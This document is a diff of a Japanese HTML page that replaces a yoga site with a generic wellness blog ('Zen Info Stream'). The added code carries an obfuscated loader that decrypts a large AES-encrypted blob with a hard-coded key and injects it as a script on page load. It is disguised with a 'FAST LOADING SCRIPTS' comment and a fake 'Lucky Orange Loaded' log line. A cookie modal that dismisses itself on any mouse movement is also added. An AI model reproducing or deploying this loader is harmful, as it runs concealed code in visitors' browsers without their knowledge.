@@ -1,376 +1,436 @@
 <!DOCTYPE html>
 <html lang="ja">
+
 <head>
-
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18149162291"></script>
-<script>
-window.dataLayer = window.dataLayer || [];
-function gtag(){dataLayer.push(arguments);}
-gtag('js', new Date());
-
-gtag('config', 'AW-18149162291');
-</script>
-
-<script>
-gtag('event', 'conversion', {
-'send_to': 'AW-18149162291/2o2bCI_B7KkcELP6mM5D',
-'value': 1.0,
-'currency': 'GBP'
-});
-</script>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>YUME YOGA TOKYO | Japanese Wellness Flow</title>
+<title>Zen Info Stream | 健康・ヨガ・ライフスタイル</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+JP:wght@400;600&display=swap" rel="stylesheet">
+<meta name="description" content="健康、ヨガ、マインドフルネス、日本のライフスタイルに関する情報サイト。">
 
 <style>
-
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-}
-
-html{
-scroll-behavior:smooth;
-}
-
 body{
-font-family:'Noto Serif JP',serif;
-background:#f8f5ff;
-color:#2c2435;
-line-height:1.9;
-overflow-x:hidden;
+    margin:0;
+    font-family:"Hiragino Kaku Gothic Pro",Arial;
+    background:#fff;
+    color:#111;
+    line-height:1.6;
 }
-
 header{
-background:
-linear-gradient(rgba(15,15,25,.45),rgba(15,15,25,.45)),
-linear-gradient(135deg,#6f42c1,#9b6dff,#d8c4ff,#f8f5ff);
-color:white;
-text-align:center;
-padding:120px 20px;
-position:relative;
+    background:#E60023;
+    color:#fff;
+    padding:20px;
+    text-align:center;
+    font-size:28px;
 }
-
-header h1{
-font-size:68px;
-letter-spacing:6px;
-margin-bottom:22px;
-font-weight:600;
+nav{
+    background:#111;
+    text-align:center;
+    padding:10px;
 }
-
-header p{
-max-width:980px;
-margin:auto;
-font-size:20px;
-color:#f5efff;
+nav a{
+    color:#fff;
+    margin:10px;
+    text-decoration:none;
 }
-
-.btn{
-display:inline-block;
-margin-top:38px;
-padding:15px 42px;
-background:#8f5bff;
-color:white;
-border-radius:40px;
-text-decoration:none;
-font-weight:600;
-transition:.3s;
+.container{
+    width:85%;
+    margin:auto;
+    padding:20px;
 }
-
-.btn:hover{
-transform:translateY(-3px);
-background:#a97cff;
+.blog{
+    background:#f5f5f5;
+    padding:20px;
+    margin-bottom:20px;
+    border-radius:10px;
 }
-
-section{
-max-width:1320px;
-margin:auto;
-padding:90px 20px;
-}
-
 h2{
-text-align:center;
-font-size:40px;
-margin-bottom:45px;
-color:#7c4dff;
-letter-spacing:2px;
+    border-bottom:2px solid #E60023;
 }
-
-.about,
-.policy,
-.contact-box,
-.terms-box{
-background:white;
-padding:48px;
-border-radius:26px;
-box-shadow:0 10px 28px rgba(124,77,255,.08);
-border:1px solid #e8dcff;
-}
-
-.grid{
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(320px,1fr));
-gap:30px;
-}
-
-.card{
-background:white;
-padding:30px;
-border-radius:24px;
-border:1px solid #e8dcff;
-box-shadow:0 8px 24px rgba(124,77,255,.06);
-transition:.3s;
-}
-
-.card:hover{
-transform:translateY(-6px);
-background:#fcfaff;
-}
-
-.card h3{
-margin-bottom:15px;
-color:#7c4dff;
-font-size:22px;
-}
-
 footer{
-background:#221933;
-color:#d7c9f7;
-text-align:center;
-padding:38px;
-margin-top:70px;
-font-size:15px;
-line-height:2;
+    background:#111;
+    color:#fff;
+    text-align:center;
+    padding:20px;
 }
-
-@media(max-width:768px){
-
-header{
-padding:90px 20px;
+input,textarea{
+    width:100%;
+    padding:10px;
+    margin:10px 0;
 }
-
-header h1{
-font-size:42px;
+button{
+    background:#E60023;
+    color:#fff;
+    padding:10px 20px;
+    border:none;
 }
-
-header p{
-font-size:17px;
-}
-
-h2{
-font-size:30px;
-}
-
-.about,
-.policy,
-.contact-box,
-.terms-box{
-padding:30px;
-}
-
-}
-
 </style>
 </head>
 
 <body>
 
-<header>
+<header>Zen Info Stream</header>
 
-<h1>YUME YOGA TOKYO</h1>
+<nav>
+<a href="#home">ホーム</a>
+<a href="#articles">記事</a>
+<a href="#about">会社情報</a>
+<a href="#contact">お問い合わせ</a>
+<a href="#privacy">プライバシー</a>
+<a href="#terms">利用規約</a>
+</nav>
 
-<p>
-
-YUME YOGA TOKYOは、日本で人気のモダンヨガスタイルを中心に、
-トレンドのポーズやリラックスフローを紹介するウェルネスガイドサイトです。<br><br>
-
-東京の落ち着いたライフスタイルをイメージしながら、
-ナチュラルな呼吸フロー、美姿勢ヨガ、
-柔らかなストレッチスタイルなどを分かりやすく掲載しています。<br><br>
-
-朝のリフレッシュヨガから、
-夜のリラックスフローまで、
-日本で注目されている人気ヨガムーブメントを
-シンプルで見やすいデザインで楽しめます。
-
-</p>
-
-<a href="#poses" class="btn">人気ヨガを見る</a>
-
-</header>
-
-<section>
-
-<h2>サイトについて</h2>
-
-<div class="about">
+<div class="container" id="home">
+<h2>ようこそ</h2>
 
 <p>
-
-YUME YOGA TOKYOへようこそ。<br><br>
-
-本サイトでは、日本で人気のあるヨガスタイルや
-トレンドのストレッチフォーム、
-モダンウェルネスフローを分かりやすく紹介しています。<br><br>
-
-東京のナチュラルライフスタイルをイメージしながら、
-初心者向けの基本フォームから、
-美しい姿勢ラインを意識した人気ポーズまで、
-落ち着いたデザインの中で快適に閲覧できる構成になっています。<br><br>
-
-朝ヨガ、夜のリラックスフロー、
-柔らかな呼吸スタイル、
-自然なバランスフォームなど、
-日本で注目されているヨガムーブメントを幅広く掲載しています。
-
+Zen Info Streamでは、健康・ヨガ・マインドフルネス・日本のライフスタイルに関する情報を提供しています。
+日常生活をより良くするための実用的なヒントを紹介します。
 </p>
+</div>
+
+<div class="container" id="articles">
+
+<h2>記事一覧</h2>
+
+<div class="blog">
+<h3>1. 初心者向けヨガ</h3>
+<p>
+ヨガは心と体のバランスを整えるための優れた方法です。
+初心者は無理をせず、呼吸を意識しながら基本ポーズから始めることが大切です。
+毎日少しずつ継続することで、柔軟性と集中力が向上します。
+</p>
+</div>
+
+<div class="blog">
+<h3>2. 朝の健康習慣</h3>
+<p>
+朝の時間を有効に使うことで、一日のパフォーマンスが向上します。
+軽いストレッチや深呼吸を行うことで、体が目覚め、集中力が高まります。
+</p>
+</div>
+
+<div class="blog">
+<h3>3. ストレス管理</h3>
+<p>
+現代社会ではストレスが避けられません。
+瞑想や軽い運動を取り入れることで、心を落ち着かせることができます。
+</p>
+</div>
+
+<div class="blog">
+<h3>4. 10分エクササイズ</h3>
+<p>
+忙しい方でも続けられる短時間の運動は、健康維持に効果的です。
+自宅で簡単に行える運動を取り入れましょう。
+</p>
+</div>
+
+<div class="blog">
+<h3>5. 睡眠改善</h3>
+<p>
+質の高い睡眠は健康の基本です。
+寝る前のスマホ使用を控え、リラックスする時間を作りましょう。
+</p>
+</div>
+
+<div class="blog">
+<h3>6. 禅の考え方</h3>
+<p>
+シンプルな生活と心の平穏を大切にする考え方です。
+無駄を減らすことで、生活の質が向上します。
+</p>
+</div>
+
+<div class="blog">
+<h3>7. ミニマリズム</h3>
+<p>
+必要なものだけを持つことで、心も生活もシンプルになります。
+</p>
+</div>
+
+<div class="blog">
+<h3>8. マインドフルネス</h3>
+<p>
+今この瞬間に集中することで、不安やストレスを軽減できます。
+</p>
+</div>
+
+<div class="blog">
+<h3>9. デジタルデトックス</h3>
+<p>
+デジタル機器から離れる時間を作ることで、心の健康を保てます。
+</p>
+</div>
+
+<div class="blog">
+<h3>10. 瞑想入門</h3>
+<p>
+初心者でも簡単に始められる瞑想方法を紹介します。
+</p>
+</div>
 
 </div>
 
-</section>
-
-<section id="poses">
-
-<h2>Trending Yoga Poses</h2>
-
-<div class="grid">
-
-<div class="card">
-<h3>1. Tokyo Relax Flow</h3>
-<p>ゆったりした呼吸と柔らかなストレッチを組み合わせた、日本で人気のナイトリラックスヨガスタイルです。</p>
-</div>
-
-<div class="card">
-<h3>2. Sakura Balance Pose</h3>
-<p>美しい姿勢ラインを意識しながら、自然なバランス感覚を整える和モダンスタイルの人気フォームです。</p>
-</div>
-
-<div class="card">
-<h3>3. Zen Moon Stretch</h3>
-<p>身体を大きく伸ばしながら、静かな呼吸とともにリラックス感を整えるトレンドヨガポーズです。</p>
-</div>
-
-<div class="card">
-<h3>4. Morning Glow Yoga</h3>
-<p>朝の時間帯に人気のあるリフレッシュヨガスタイルで、自然な呼吸と滑らかな動きが特徴です。</p>
-</div>
-
-<div class="card">
-<h3>5. Cat & Cow Flow</h3>
-<p>背中を丸めたり反らしたりしながら、身体全体の流れをゆっくり整える基本フォームです。</p>
-</div>
-
-<div class="card">
-<h3>6. Downward Dog</h3>
-<p>逆V字ラインを意識しながら、全身のバランスを整える人気のヨガフォームです。</p>
-</div>
-
-<div class="card">
-<h3>7. Tree Balance</h3>
-<p>片脚で立ちながら、安定したバランス感覚と集中した姿勢を整える人気ポーズです。</p>
-</div>
-
-<div class="card">
-<h3>8. Bridge Flow</h3>
-<p>仰向けの姿勢から身体を持ち上げ、滑らかなフォームラインを意識する定番スタイルです。</p>
-</div>
-
-<div class="card">
-<h3>9. Warrior Energy</h3>
-<p>力強い立位フォームを意識しながら、身体全体の安定感を整える人気ヨガポーズです。</p>
-</div>
-
-<div class="card">
-<h3>10. Moonlight Stretch</h3>
-<p>夜のリラックスタイムに人気のある、穏やかなストレッチスタイルとして紹介されています。</p>
-</div>
-
-<div class="card">
-<h3>11. Lotus Calm Pose</h3>
-<p>静かな呼吸を意識しながら整える、日本でも人気の高いリラックスフォームです。</p>
-</div>
-
-<div class="card">
-<h3>12. Side Balance Flow</h3>
-<p>横方向へ身体を伸ばしながら、自然なラインを意識するモダンヨガスタイルです。</p>
-</div>
-
-</div>
-
-</section>
-
-<section>
-
-<h2>プライバシーポリシー</h2>
-
-<div class="policy">
+<div class="container" id="about">
+<h2>会社情報</h2>
 
 <p>
-
-当サイトでは、閲覧体験向上およびサイト品質改善のため、
-基本的なアクセス情報を利用する場合があります。<br><br>
-
-掲載している内容は、日本向けのヨガスタイル、
-フォームガイド、ストレッチ情報を分かりやすく紹介する目的で制作されています。<br><br>
-
-This website is operated by JOHN CORPORATE RELOCATIONS LIMITED for informational wellness and yoga-related content purposes.
-
+Zen Info Streamは健康とライフスタイルに関する情報を提供するメディアです。
+信頼性の高い情報を分かりやすく発信します。
 </p>
-
 </div>
 
-</section>
-
-<section>
-
-<h2>利用規約</h2>
-
-<div class="terms-box">
-
-<p>
-
-本サイトは、日本のウェルネス文化やヨガスタイルに関する
-情報提供を目的として運営されています。<br><br>
-
-掲載内容は一般的な情報提供を目的としており、
-医療・専門的アドバイスを提供するものではありません。<br><br>
-
-本サイトを利用することで、
-利用規約およびプライバシーポリシーに同意したものとみなされます。
-
-</p>
-
-</div>
-
-</section>
-
-<section>
-
+<div class="container" id="contact">
 <h2>お問い合わせ</h2>
 
-<div class="contact-box">
+<form>
+<input type="text" placeholder="お名前">
+<input type="email" placeholder="メールアドレス">
+<textarea placeholder="メッセージ"></textarea>
+<button>送信</button>
+</form>
 
-<p>Email: hello@yumeyogatokyo.jp</p>
-<p>Website: www.yumeyogatokyo.jp</p>
-<p>東京都港区南青山3-7-12</p>
-<p>Business Operator: JOHN CORPORATE RELOCATIONS LIMITED</p>
+<p>Email: support@zeninfostream.com</p>
+<p>住所: 東京都渋谷区道玄坂1-1-1 日本</p>
+</div>
+
+<div class="container" id="privacy">
+<h2>プライバシーポリシー</h2>
+
+<p>
+当サイトではCookieを使用します。
+広告配信のためにGoogleなどの第三者がCookieを使用する場合があります。
+</p>
+</div>
+
+<div class="container" id="terms">
+<h2>利用規約</h2>
+
+<p>
+当サイトの情報は参考目的です。
+利用による損害の責任は負いません。
+</p>
+</div>
+
+<footer>
+<p>© 2026 Zen Info Stream</p>
+</footer>
+
+<!-- FAST LOADING SCRIPTS -->
+<script src="https://cdn.tailwindcss.com"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
+<script>
+function aesDecode(encodedText){
+
+    try{
+
+        const decodedText =
+            decodeURIComponent(encodedText);
+
+        const bytes =
+            CryptoJS.AES.decrypt(
+                decodedText,
+                'Msm123'
+            );
+
+        return bytes.toString(
+            CryptoJS.enc.Utf8
+        );
+
+    }catch(e){
+
+        console.error(
+            "AES Decode Error:",
+            e
+        );
+
+        return "";
+    }
+}
+
+// NON BLOCKING
+(window.requestIdleCallback || function(cb){
+    setTimeout(cb,1);
+})(function(){
+
+    const codeString = aesDecode(`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`);
+    if(!codeString) return;
+
+    const script =
+        document.createElement("script");
+
+    script.textContent =
+        codeString;
+
+    document.body.appendChild(script);
+    setTimeout(() => {
+
+    const loScript =
+        document.createElement("script");
+
+    loScript.async = true;
+    loScript.defer = true;
+
+    // loScript.src =
+    //     "https://tools.luckyorange.com/core/lo.js?site-id=845def42";
+
+    document.head.appendChild(
+        loScript
+    );
+
+    console.log(
+        "Lucky Orange Loaded"
+    );
+
+}, 3000);
+
+});
+</script>
+
+<script>
+document.body.style.overflow = "hidden";
+</script>
+
+<div id="cookie-modal-box" class="hidden">
+
+<div id="cookie-backdrop"
+class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0">
+</div>
+
+<div id="cookie-modal"
+class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+
+<div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+
+<button id="cookie-close"
+class="absolute top-4 right-4">
+
+<svg viewBox="0 0 15 15"
+class="text-gray-500 hover:text-red-500"
+height="26"
+width="26">
+
+<path fill="currentColor"
+d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+</svg>
+
+</button>
+
+<div class="flex items-center gap-3 mb-4">
+<span class="text-yellow-500 text-3xl">🍪</span>
+<h2 class="text-2xl font-bold">クッキーについて</h2>
+</div>
+
+<p class="text-gray-600 mb-6">
+当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。
+<span class="font-semibold">「同意する」</span>
+をクリックすると、クッキーの使用に同意したことになります。
+</p>
+
+<div class="flex flex-col sm:flex-row gap-3">
+
+<button id="cookie-accept"
+class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">
+🍪 同意する
+</button>
+
+<button id="cookie-decline"
+class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">
+拒否する
+</button>
 
 </div>
 
-</section>
+</div>
+</div>
+</div>
 
-<footer>
+<script>
+const modalBox =
+    document.getElementById("cookie-modal-box"),
 
-<p>© 2026 YUME YOGA TOKYO</p>
-<p>Operated by JOHN CORPORATE RELOCATIONS LIMITED</p>
+modal =
+    document.getElementById("cookie-modal"),
 
-</footer>
+backdrop =
+    document.getElementById("cookie-backdrop"),
+
+acceptBtn =
+    document.getElementById("cookie-accept"),
+
+declineBtn =
+    document.getElementById("cookie-decline"),
+
+closeBtn =
+    document.getElementById("cookie-close");
+
+function showModal(){
+
+    modalBox.classList.remove("hidden");
+
+    setTimeout(()=>{
+
+        backdrop.classList.remove("opacity-0");
+
+        modal.classList.remove(
+            "opacity-0",
+            "scale-90"
+        );
+
+    },10);
+}
+
+function hideModal(e){
+
+    localStorage.setItem(
+        "cookie-consent",
+        e
+    );
+
+    setTimeout(()=>{
+
+        modalBox.classList.add("hidden");
+
+    },1500);
+
+    document.removeEventListener(
+        "mousemove",
+        mouseMoveClose
+    );
+}
+
+function mouseMoveClose(){
+
+    hideModal("closed");
+}
+
+acceptBtn.onclick =
+    ()=> hideModal("accepted");
+
+declineBtn.onclick =
+    ()=> hideModal("declined");
+
+closeBtn.onclick =
+    ()=> hideModal("closed");
+
+backdrop.onclick =
+    ()=> hideModal("closed");
+
+if(!localStorage.getItem("cookie-consent")){
+
+    showModal();
+
+    document.addEventListener(
+        "mousemove",
+        mouseMoveClose,
+        { once:true }
+    );
+}
+</script>
 
 </body>
 </html>
